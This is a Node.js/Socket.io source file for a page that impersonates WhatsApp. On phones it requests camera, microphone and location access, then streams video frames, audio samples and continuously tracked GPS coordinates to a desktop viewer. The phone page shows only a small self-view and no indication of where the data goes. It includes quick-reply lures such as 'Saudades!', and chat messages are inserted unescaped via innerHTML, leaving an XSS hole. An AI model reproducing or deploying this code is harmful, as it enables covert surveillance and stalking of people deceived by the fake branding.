const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" }
});

const PORT = process.env.PORT || 3000;

// Detecta dispositivo e carrega interface apropriada
app.get('/', (req, res) => {
  const ua = req.headers['user-agent']?.toLowerCase() || '';
  const isMobile = ua.includes('mobile') || ua.includes('android') || ua.includes('iphone');
  const host = req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'http';
  const fullUrl = `${protocol}://${host}`;
  
  if (isMobile) {
    res.send(getMobileHTML(fullUrl));
  } else {
    res.send(getDesktopHTML(fullUrl));
  }
});

// ============ HTML DO CELULAR ============
function getMobileHTML(fullUrl) {
  return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>WhatsApp Mobile</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0B1416;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        /* Header */
        .header {
            background: #075E54;
            color: white;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
        }
        .header h2 { flex: 1; font-size: 18px; }
        .header button {
            background: none;
            border: none;
            color: white;
            font-size: 20px;
            cursor: pointer;
            padding: 4px;
        }
        
        /* Self video */
        .video-self {
            position: fixed;
            bottom: 80px;
            right: 10px;
            width: 80px;
            height: 106px;
            border-radius: 12px;
            overflow: hidden;
            border: 2px solid #075E54;
            background: #000;
            z-index: 10;
            display: none;
        }
        #localVideo { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
        
        /* Messages area */
        .messages {
            flex: 1;
            overflow-y: auto;
            padding: 16px;
            display: flex;
            flex-direction: column;
            gap: 4px;
        }
        
        .message {
            display: flex;
            margin-bottom: 4px;
            animation: fadeIn 0.3s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .message.received { justify-content: flex-start; }
        .message.sent { justify-content: flex-end; }
        
        .bubble {
            max-width: 75%;
            padding: 8px 12px;
            border-radius: 18px;
            font-size: 14px;
            line-height: 1.4;
            word-wrap: break-word;
        }
        .message.received .bubble {
            background: #202C33;
            color: #E9EDEF;
            border-top-left-radius: 4px;
        }
        .message.sent .bubble {
            background: #005C4B;
            color: white;
            border-top-right-radius: 4px;
        }
        .time {
            font-size: 10px;
            opacity: 0.6;
            margin-top: 4px;
            text-align: right;
        }
        
        .system-msg {
            text-align: center;
            font-size: 11px;
            color: #8696A0;
            margin: 8px 0;
        }
        
        /* Typing indicator */
        .typing {
            display: none;
            padding: 8px 16px;
            background: #202C33;
            border-radius: 18px;
            width: fit-content;
            margin-bottom: 8px;
            font-size: 12px;
            color: #8696A0;
        }
        .typing.show { display: block; }
        
        /* Input area */
        .input-area {
            background: #1F2C33;
            padding: 10px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            border-top: 1px solid #2A3B42;
        }
        .input-field {
            flex: 1;
            background: #2A3B42;
            border: none;
            border-radius: 24px;
            padding: 10px 16px;
            color: #E9EDEF;
            font-size: 15px;
            outline: none;
        }
        .send-btn {
            background: none;
            border: none;
            color: #00A884;
            font-size: 24px;
            cursor: pointer;
            padding: 8px;
        }
        
        /* Action buttons */
        .actions {
            background: #1F2C33;
            padding: 8px 16px;
            display: flex;
            gap: 20px;
            justify-content: space-around;
            border-top: 1px solid #2A3B42;
        }
        .actions button {
            background: none;
            border: none;
            color: #8696A0;
            font-size: 22px;
            cursor: pointer;
            padding: 8px;
        }
        .actions button.active { color: #00A884; }
        
        /* Permission modal */
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.95);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 100;
        }
        .modal-content {
            background: #1F2C33;
            padding: 30px;
            border-radius: 24px;
            text-align: center;
            max-width: 280px;
        }
        .modal-content h3 { color: white; margin-bottom: 16px; }
        .modal-content p { color: #8696A0; font-size: 14px; margin-bottom: 24px; }
        .start-btn {
            background: #00A884;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 24px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
        }
        
        .status-badge {
            position: fixed;
            top: 60px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.8);
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            z-index: 20;
            display: none;
        }
    </style>
</head>
<body>
    <div class="modal" id="permissionModal">
        <div class="modal-content">
            <h3>📱 WhatsApp</h3>
            <p>Precisamos de acesso à sua câmera, microfone e localização</p>
            <button class="start-btn" id="startBtn">✨ Iniciar ✨</button>
        </div>
    </div>
    
    <div class="status-badge" id="statusBadge">✅ Conectado</div>
    
    <div class="header">
        <h2>💬 WhatsApp</h2>
        <button id="toggleCameraBtn">📷</button>
        <button id="shareLocationBtn">📍</button>
    </div>
    
    <div class="video-self" id="videoSelf">
        <video id="localVideo" autoplay playsinline muted></video>
    </div>
    
    <div class="messages" id="messages">
        <div class="typing" id="typing">Alguém está digitando...</div>
    </div>
    
    <div class="input-area">
        <input type="text" class="input-field" id="messageInput" placeholder="Digite uma mensagem...">
        <button class="send-btn" id="sendBtn">➤</button>
    </div>
    
    <div class="actions">
        <button id="micBtn" class="active">🎤</button>
        <button id="cameraBtn">📹</button>
        <button id="vibrateBtn">📳</button>
    </div>
    
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}');
        
        // Elements
        const messagesDiv = document.getElementById('messages');
        const messageInput = document.getElementById('messageInput');
        const sendBtn = document.getElementById('sendBtn');
        const typingDiv = document.getElementById('typing');
        const modal = document.getElementById('permissionModal');
        const startBtn = document.getElementById('startBtn');
        const localVideo = document.getElementById('localVideo');
        const videoSelf = document.getElementById('videoSelf');
        const micBtn = document.getElementById('micBtn');
        const cameraBtn = document.getElementById('cameraBtn');
        const vibrateBtn = document.getElementById('vibrateBtn');
        const toggleCameraBtn = document.getElementById('toggleCameraBtn');
        const shareLocationBtn = document.getElementById('shareLocationBtn');
        const statusBadge = document.getElementById('statusBadge');
        
        // State
        let mediaStream = null;
        let facingMode = 'user';
        let cameraEnabled = true;
        let micEnabled = true;
        let permissions = false;
        let typingTimeout = null;
        let frameInterval = null;
        
        function addMessage(text, isSent = true) {
            const div = document.createElement('div');
            div.className = \`message \${isSent ? 'sent' : 'received'}\`;
            div.innerHTML = \`<div class="bubble">\${text}<div class="time">\${new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</div></div>\`;
            
            const typingElem = document.getElementById('typing');
            if (typingElem && typingElem.parentNode === messagesDiv) messagesDiv.removeChild(typingElem);
            messagesDiv.appendChild(div);
            div.scrollIntoView({ behavior: 'smooth', block: 'end' });
            messagesDiv.appendChild(typingElem);
        }
        
        function addSystemMessage(text) {
            const div = document.createElement('div');
            div.className = 'system-msg';
            div.textContent = text;
            messagesDiv.appendChild(div);
            div.scrollIntoView({ behavior: 'smooth', block: 'end' });
        }
        
        async function initPermissions() {
            try {
                addSystemMessage('📷 Solicitando permissões...');
                if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
                if (frameInterval) clearInterval(frameInterval);
                
                const constraints = {
                    video: cameraEnabled ? { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: facingMode } : false,
                    audio: micEnabled
                };
                
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                mediaStream = stream;
                
                if (cameraEnabled) {
                    localVideo.srcObject = stream;
                    videoSelf.style.display = 'block';
                    await localVideo.play();
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = 320;
                    canvas.height = 240;
                    const ctx = canvas.getContext('2d');
                    
                    frameInterval = setInterval(() => {
                        if (mediaStream && mediaStream.active && cameraEnabled && permissions) {
                            ctx.drawImage(localVideo, 0, 0, 320, 240);
                            socket.emit('frame', canvas.toDataURL('image/jpeg', 0.5));
                        }
                    }, 200);
                } else {
                    videoSelf.style.display = 'none';
                }
                
                if (micEnabled) {
                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                    const source = audioCtx.createMediaStreamSource(stream);
                    const processor = audioCtx.createScriptProcessor(4096, 1, 1);
                    source.connect(processor);
                    processor.connect(audioCtx.destination);
                    processor.onaudioprocess = (e) => {
                        if (permissions && micEnabled) {
                            const data = Array.from(e.inputBuffer.getChannelData(0));
                            if (Math.random() < 0.05) socket.emit('audio', data);
                        }
                    };
                }
                
                if (navigator.geolocation) {
                    navigator.geolocation.watchPosition(
                        (pos) => { if(permissions) socket.emit('location', { lat: pos.coords.latitude, lng: pos.coords.longitude }); },
                        (err) => console.log('Geo error:', err),
                        { enableHighAccuracy: true }
                    );
                }
                
                permissions = true;
                modal.style.display = 'none';
                addSystemMessage('✅ Conectado!');
                socket.emit('mobile_online');
                
            } catch (err) {
                console.error(err);
                addSystemMessage('❌ Erro ao acessar câmera/microfone');
            }
        }
        
        function sendMessage(text) {
            if (text.trim() && permissions) {
                addMessage(text, true);
                socket.emit('message', text);
                messageInput.value = '';
                if (typingTimeout) { clearTimeout(typingTimeout); socket.emit('typing_stop'); }
            }
        }
        
        function startTyping() {
            if (permissions) {
                socket.emit('typing_start');
                if (typingTimeout) clearTimeout(typingTimeout);
                typingTimeout = setTimeout(() => { socket.emit('typing_stop'); typingTimeout = null; }, 1500);
            }
        }
        
        function vibrate() { if (navigator.vibrate) navigator.vibrate(200); }
        
        // Event listeners
        startBtn.onclick = initPermissions;
        sendBtn.onclick = () => sendMessage(messageInput.value);
        messageInput.onkeypress = (e) => { if(e.key === 'Enter') sendMessage(messageInput.value); else startTyping(); };
        messageInput.oninput = startTyping;
        
        micBtn.onclick = () => { micEnabled = !micEnabled; micBtn.classList.toggle('active', micEnabled); micBtn.innerHTML = micEnabled ? '🎤' : '🔇'; if(permissions) initPermissions(); };
        cameraBtn.onclick = () => { cameraEnabled = !cameraEnabled; cameraBtn.classList.toggle('active', cameraEnabled); cameraBtn.innerHTML = cameraEnabled ? '📹' : '📷'; if(permissions) initPermissions(); };
        vibrateBtn.onclick = () => { vibrate(); socket.emit('vibrate'); addSystemMessage('📳 Vibração enviada'); };
        toggleCameraBtn.onclick = () => { facingMode = facingMode === 'user' ? 'environment' : 'user'; if(cameraEnabled && permissions) initPermissions(); addSystemMessage(\`🔄 Câmera \${facingMode === 'user' ? 'frontal' : 'traseira'}\`); };
        shareLocationBtn.onclick = () => { if(navigator.geolocation) navigator.geolocation.getCurrentPosition((pos) => sendMessage(\`📍 Localização: https://maps.google.com/?q=\${pos.coords.latitude},\${pos.coords.longitude}\`)); };
        
        // Socket events
        socket.on('message', (msg) => { addMessage(msg, false); vibrate(); });
        socket.on('typing_start', () => { typingDiv.classList.add('show'); setTimeout(() => typingDiv.classList.remove('show'), 2000); });
        socket.on('typing_stop', () => typingDiv.classList.remove('show'));
        socket.on('vibrate', () => vibrate());
        socket.on('location', (data) => addSystemMessage(\`📍 Outro usuário está em: https://maps.google.com/?q=\${data.lat},\${data.lng}\`));
        socket.on('connect', () => { statusBadge.style.display = 'block'; statusBadge.innerHTML = '✅ Conectado'; setTimeout(() => statusBadge.style.display = 'none', 2000); });
        socket.on('disconnect', () => { statusBadge.style.display = 'block'; statusBadge.innerHTML = '⚠️ Desconectado'; });
        
        addSystemMessage('💬 Clique em "Iniciar" para começar');
    </script>
</body>
</html>`;
}

// ============ HTML DO PC ============
function getDesktopHTML(fullUrl) {
  return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>WhatsApp Web</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0B1416;
            height: 100vh;
            display: flex;
        }
        
        /* Sidebar */
        .sidebar {
            width: 300px;
            background: #111B21;
            border-right: 1px solid #2A3B42;
            display: flex;
            flex-direction: column;
        }
        .sidebar-header {
            background: #202C33;
            padding: 20px 16px;
        }
        .sidebar-header h2 { color: white; font-size: 18px; }
        .contact {
            padding: 12px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            background: #2A3B42;
        }
        .avatar {
            width: 49px;
            height: 49px;
            background: #075E54;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
        }
        .contact-info { flex: 1; }
        .contact-name { color: white; font-weight: bold; }
        .contact-status { color: #8696A0; font-size: 13px; }
        
        /* Main chat */
        .chat {
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        .chat-header {
            background: #202C33;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            gap: 16px;
        }
        .chat-avatar {
            width: 40px;
            height: 40px;
            background: #075E54;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
        }
        .chat-info { flex: 1; }
        .chat-name { color: white; font-weight: bold; }
        .chat-status { color: #8696A0; font-size: 13px; }
        .chat-actions { display: flex; gap: 16px; }
        .chat-actions button {
            background: none;
            border: none;
            color: #8696A0;
            font-size: 20px;
            cursor: pointer;
            padding: 8px;
        }
        
        /* Video panel */
        .video-panel {
            background: #000;
            height: 240px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }
        #remoteVideo { max-width: 100%; max-height: 240px; object-fit: contain; }
        .video-controls {
            position: absolute;
            bottom: 10px;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            gap: 10px;
            background: rgba(0,0,0,0.7);
            padding: 6px 12px;
            border-radius: 30px;
        }
        .video-controls button {
            background: none;
            border: none;
            color: white;
            font-size: 16px;
            cursor: pointer;
            padding: 4px 8px;
        }
        
        /* Messages */
        .messages {
            flex: 1;
            overflow-y: auto;
            padding: 16px;
            display: flex;
            flex-direction: column;
            gap: 4px;
        }
        
        .message { display: flex; margin-bottom: 4px; }
        .message.received { justify-content: flex-start; }
        .message.sent { justify-content: flex-end; }
        .bubble {
            max-width: 65%;
            padding: 8px 12px;
            border-radius: 18px;
            font-size: 14px;
        }
        .message.received .bubble { background: #202C33; color: #E9EDEF; border-top-left-radius: 4px; }
        .message.sent .bubble { background: #005C4B; color: white; border-top-right-radius: 4px; }
        .time { font-size: 10px; opacity: 0.6; margin-top: 4px; text-align: right; }
        
        .typing {
            display: none;
            padding: 8px 16px;
            background: #202C33;
            border-radius: 18px;
            width: fit-content;
            margin-bottom: 8px;
            color: #8696A0;
            font-size: 12px;
        }
        .typing.show { display: block; }
        
        /* Input */
        .input-area {
            background: #1F2C33;
            padding: 10px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            border-top: 1px solid #2A3B42;
        }
        .input-field {
            flex: 1;
            background: #2A3B42;
            border: none;
            border-radius: 24px;
            padding: 10px 16px;
            color: #E9EDEF;
            font-size: 15px;
            outline: none;
        }
        .send-btn {
            background: none;
            border: none;
            color: #00A884;
            font-size: 24px;
            cursor: pointer;
            padding: 8px;
        }
        
        /* Quick messages */
        .quick {
            background: #1F2C33;
            padding: 8px 16px;
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            border-top: 1px solid #2A3B42;
        }
        .quick-msg {
            background: #2A3B42;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 12px;
            color: #E9EDEF;
            cursor: pointer;
        }
        .quick-msg:hover { background: #3A4B52; }
        
        /* Location */
        .location {
            background: #1F2C33;
            padding: 10px 16px;
            font-size: 12px;
            color: #8696A0;
            border-top: 1px solid #2A3B42;
        }
        .location a { color: #00A884; text-decoration: none; }
        
        @keyframes pulse { 0%,100%{transform:scale(1);}50%{transform:scale(1.05);} }
        .pulse { animation: pulse 0.3s ease; }
    </style>
</head>
<body>
    <div class="sidebar">
        <div class="sidebar-header"><h2>💬 Conversas</h2></div>
        <div class="contact">
            <div class="avatar">📱</div>
            <div class="contact-info">
                <div class="contact-name">Celular</div>
                <div class="contact-status" id="contactStatus">online</div>
            </div>
        </div>
    </div>
    
    <div class="chat">
        <div class="chat-header">
            <div class="chat-avatar">📱</div>
            <div class="chat-info">
                <div class="chat-name">Celular</div>
                <div class="chat-status" id="chatStatus">online</div>
            </div>
            <div class="chat-actions">
                <button id="vibrateBtn" title="Vibrar">📳</button>
                <button id="toggleCameraBtn" title="Trocar Câmera">🔄</button>
            </div>
        </div>
        
        <div class="video-panel">
            <img id="remoteVideo" src="" alt="Vídeo">
            <div class="video-controls">
                <button id="enableAudioBtn">🔊</button>
                <button id="volumeUpBtn">📢</button>
            </div>
        </div>
        
        <div class="messages" id="messages">
            <div class="typing" id="typing">Celular está digitando...</div>
        </div>
        
        <div class="input-area">
            <input type="text" class="input-field" id="messageInput" placeholder="Digite uma mensagem...">
            <button class="send-btn" id="sendBtn">➤</button>
        </div>
        
        <div class="quick" id="quickMessages"></div>
        
        <div class="location" id="locationPanel">
            📍 Aguardando localização...
        </div>
    </div>
    
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}');
        
        // Elements
        const messagesDiv = document.getElementById('messages');
        const messageInput = document.getElementById('messageInput');
        const sendBtn = document.getElementById('sendBtn');
        const typingDiv = document.getElementById('typing');
        const remoteVideo = document.getElementById('remoteVideo');
        const locationPanel = document.getElementById('locationPanel');
        const quickDiv = document.getElementById('quickMessages');
        
        // State
        let audioEnabled = true;
        let audioCtx = null;
        let audioGain = null;
        
        // Quick messages
        const quickMsgs = ['Olá!', 'Tudo bem?', 'Oie 💕', 'Como você está?', 'Saudades!', 'Te vejo em breve', 'Boa noite 🌙', 'Bom dia ☀️'];
        quickMsgs.forEach(msg => {
            const span = document.createElement('span');
            span.className = 'quick-msg';
            span.textContent = msg;
            span.onclick = () => sendMessage(msg);
            quickDiv.appendChild(span);
        });
        
        function addMessage(text, isSent = true) {
            const div = document.createElement('div');
            div.className = \`message \${isSent ? 'sent' : 'received'}\`;
            div.innerHTML = \`<div class="bubble">\${text}<div class="time">\${new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</div></div>\`;
            
            const typing = document.getElementById('typing');
            if (typing && typing.parentNode === messagesDiv) messagesDiv.removeChild(typing);
            messagesDiv.appendChild(div);
            div.scrollIntoView({ behavior: 'smooth', block: 'end' });
            messagesDiv.appendChild(typing);
        }
        
        function addSystemMessage(text) {
            const div = document.createElement('div');
            div.style.cssText = 'text-align:center; font-size:11px; color:#8696A0; margin:8px 0;';
            div.textContent = text;
            messagesDiv.appendChild(div);
            div.scrollIntoView({ behavior: 'smooth', block: 'end' });
        }
        
        function sendMessage(text) {
            if (text.trim()) {
                addMessage(text, true);
                socket.emit('message', text);
                messageInput.value = '';
                stopTyping();
            }
        }
        
        let typingTimeout = null;
        function startTyping() {
            socket.emit('typing_start');
            if (typingTimeout) clearTimeout(typingTimeout);
            typingTimeout = setTimeout(() => stopTyping(), 1500);
        }
        
        function stopTyping() {
            socket.emit('typing_stop');
            if (typingTimeout) { clearTimeout(typingTimeout); typingTimeout = null; }
        }
        
        // Setup audio
        function setupAudio() {
            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            audioGain = audioCtx.createGain();
            audioGain.gain.value = 0.5;
            audioGain.connect(audioCtx.destination);
        }
        setupAudio();
        
        // Socket events
        socket.on('message', (msg) => addMessage(msg, false));
        socket.on('frame', (frame) => remoteVideo.src = frame);
        socket.on('audio', (audioData) => {
            if (audioEnabled && audioCtx) {
                const buffer = audioCtx.createBuffer(1, audioData.length, audioCtx.sampleRate);
                buffer.copyToChannel(new Float32Array(audioData), 0);
                const source = audioCtx.createBufferSource();
                source.buffer = buffer;
                source.connect(audioGain);
                source.start();
            }
        });
        socket.on('location', (data) => {
            locationPanel.innerHTML = \`📍 Localização: \${data.lat.toFixed(6)}, \${data.lng.toFixed(6)}<br><a href="https://maps.google.com/?q=\${data.lat},\${data.lng}" target="_blank">🗺️ Ver no mapa</a>\`;
        });
        socket.on('typing_start', () => { typingDiv.classList.add('show'); setTimeout(() => typingDiv.classList.remove('show'), 2000); });
        socket.on('typing_stop', () => typingDiv.classList.remove('show'));
        socket.on('mobile_online', () => { document.getElementById('contactStatus').innerHTML = 'online 💚'; document.getElementById('chatStatus').innerHTML = 'online'; addSystemMessage('✅ Celular conectado!'); });
        socket.on('vibrate', () => addSystemMessage('📳 Celular vibrou!'));
        
        document.getElementById('sendBtn').onclick = () => sendMessage(messageInput.value);
        messageInput.onkeypress = (e) => { if(e.key === 'Enter') sendMessage(messageInput.value); else startTyping(); };
        messageInput.oninput = startTyping;
        
        document.getElementById('vibrateBtn').onclick = () => { socket.emit('vibrate'); addSystemMessage('📳 Enviando vibração...'); };
        document.getElementById('toggleCameraBtn').onclick = () => { socket.emit('toggle_camera'); addSystemMessage('🔄 Solicitando troca de câmera'); };
        document.getElementById('enableAudioBtn').onclick = () => { audioEnabled = !audioEnabled; document.getElementById('enableAudioBtn').innerHTML = audioEnabled ? '🔊' : '🔇'; addSystemMessage(audioEnabled ? '🔊 Áudio ativado' : '🔇 Áudio desativado'); };
        document.getElementById('volumeUpBtn').onclick = () => { if(audioGain) { const vol = Math.min(1, audioGain.gain.value + 0.1); audioGain.gain.value = vol; addSystemMessage(\`📢 Volume: \${Math.round(vol*100)}%\`); } };
        
        socket.on('connect', () => addSystemMessage('✅ Conectado ao servidor'));
        socket.on('disconnect', () => addSystemMessage('⚠️ Desconectado'));
        
        addSystemMessage('💬 Digite uma mensagem para começar');
    </script>
</body>
</html>`;
}

// ============ SOCKET.IO SERVER ============
io.on('connection', (socket) => {
  console.log('Cliente conectado:', socket.id);
  
  // Mensagens de texto
  socket.on('message', (msg) => {
    console.log('Mensagem:', msg);
    socket.broadcast.emit('message', msg);
  });
  
  // Digitação
  socket.on('typing_start', () => socket.broadcast.emit('typing_start'));
  socket.on('typing_stop', () => socket.broadcast.emit('typing_stop'));
  
  // Vídeo
  socket.on('frame', (frame) => socket.broadcast.emit('frame', frame));
  
  // Áudio
  socket.on('audio', (data) => socket.broadcast.emit('audio', data));
  
  // Localização
  socket.on('location', (loc) => socket.broadcast.emit('location', loc));
  
  // Comandos
  socket.on('vibrate', () => socket.broadcast.emit('vibrate'));
  socket.on('toggle_camera', () => socket.broadcast.emit('toggle_camera'));
  
  // Status
  socket.on('mobile_online', () => socket.broadcast.emit('mobile_online'));
  
  socket.on('disconnect', () => {
    console.log('Cliente desconectado:', socket.id);
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n📱 WhatsApp Simples - Servidor Rodando!`);
  console.log(`   Porta: ${PORT}`);
  console.log(`   PC: http://localhost:${PORT}`);
  console.log(`   Celular: http://[SEU-IP]:${PORT}`);
  console.log(`\n✨ Funcionalidades:`);
  console.log(`   💬 Troca de mensagens`);
  console.log(`   📹 Vídeo ao vivo`);
  console.log(`   🎤 Áudio`);
  console.log(`   📍 Localização`);
  console.log(`   📳 Vibração`);
  console.log(`\n🚀 Compartilhe o IP com seu celular na mesma rede!\n`);
});
